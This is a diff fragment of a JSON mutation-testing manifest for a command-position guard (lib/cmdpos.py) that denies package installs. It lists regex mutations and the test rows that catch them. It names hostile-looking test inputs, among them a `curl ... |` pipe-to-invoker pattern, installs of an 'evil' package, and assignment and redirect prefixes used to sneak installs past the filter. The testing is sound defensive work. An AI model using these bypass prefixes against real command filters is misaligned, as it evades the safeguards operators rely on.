+      "why": "trailing optional-group drop (inventory PR-TRAILGROUP-OPT, lib/cmdpos.py:857): remove the `?` from the trailing wrapper/word-run/brace group `(...)?`, making a wrapper MANDATORY, so a non-wrapper-only prefix (assignment/redirect/keyword) no longer reaches command position. BROAD structural narrowing: it also reddens the [fdclass] and [sinkrep] rows and hundreds of existing no-wrapper-prefix rows (measured 517 diff reds at C3''); the [trailopt] assignment-only row is its named representative and the [trailopt ctrl] row (same install behind a wrapper) stays deny, isolating the missing wrapper as the cause.",
+      "find": "\"[({]*)?\")",
+      "replace": "\"[({]*)\")",
+      "expect": {
+        "test_substrate_differential.py": "[trailopt]: assignment-only prefix"
+      }
+    },
+    {
+      "id": "sinkrep",
+      "why": "not_words divergence-sink bound (inventory NW-CLS-SINKREP, lib/cmdpos.py:710): narrow the sink `cls*` -> `cls{0,16}` in `return \"(\" + d + cls + \"*\" + ...`, bounding arm C's post-divergence basename tail. ESCAPE at C3'': no existing behavioural row in either suite carried a >16-char basename tail after a ROOT divergence, so the shipped 36-set had zero reds for this narrowing (test_substrate_differential 4278/0 and test_composition 163/0 both unchanged). New sole-matcher row [sinkrep] (`A=1/z`+40*'a'; `z` begins no prefix word so it takes not_words' root sink) reddens deny->allow; g1path16 bounds the DIRECTORY run `nonspace*/` (here just `1/`) and leaves it deny, so only this sink bound flips it. The [sinkrep ctrl] row (L=8 tail) stays deny.",
+      "find": "cls + \"*\"",
+      "replace": "cls + \"{0,16}\"",
+      "expect": {
+        "test_substrate_differential.py": "[sinkrep]: arm-C long basename"
+      }
+    },
+    {
+      "id": "g-nonabs-outer-bound",
+      "why": "citing mutation for an enumerated narrowing already caught by an existing row: bounds prefix_run's OUTER prefix-token repetition (nonabs)* at lib/cmdpos.py:855 -- the whole assignment / glued-redirect / spaced-redirect / brace / keyword group -- to {0,1}, so a SECOND command-position prefix token is no longer skipped and an install behind two or more prefixes fails open on both substrates. DISTINCT SITE from g-wordrun-bound, which bounds the INNER wrapper word run (nonspace+ space)* at :856. Already caught by the EXISTING P1(c) pipe-stage verdict rows for the two-assignment prefix `curl ... | A=1 B=2 <invoker>` (the second assignment travels the outer star), so per D3 no new row is owed and this mutation cites one. Measured 2026-09-16 at C3'' 36c4be20 (find binds 1x): base deny/deny; under the {0,1} bound `P1(c) assignment 'A=1 B=2' before an invoker` and 'costs the exemption' flip deny->allow, while the 'behind env' twin and every single-assignment P1(c) row stay deny (env consumes the assignments via the wrapper arm; {0,1} still admits one nonabs). Direct command-position twins `A=1 B=2 pip install evil`, `A=1 B=2 C=3 npm install evil`, `2>x 3>y pip install evil` also flip deny->allow while control `A=1 pip install evil` stays deny (emitted-gate probe, both substrates). Mini-gate: CAUGHT, sole matcher, control escapes, MERGE GATE PASS.",
+      "find": "return (nonabs + \"*\"",
+      "replace": "return (nonabs + \"{0,1}\"",
+      "expect": {
+        "test_substrate_differential.py": "P1(c) assignment 'A=1 B=2' before an invoker"
+      }
+    }
+  ]
+}
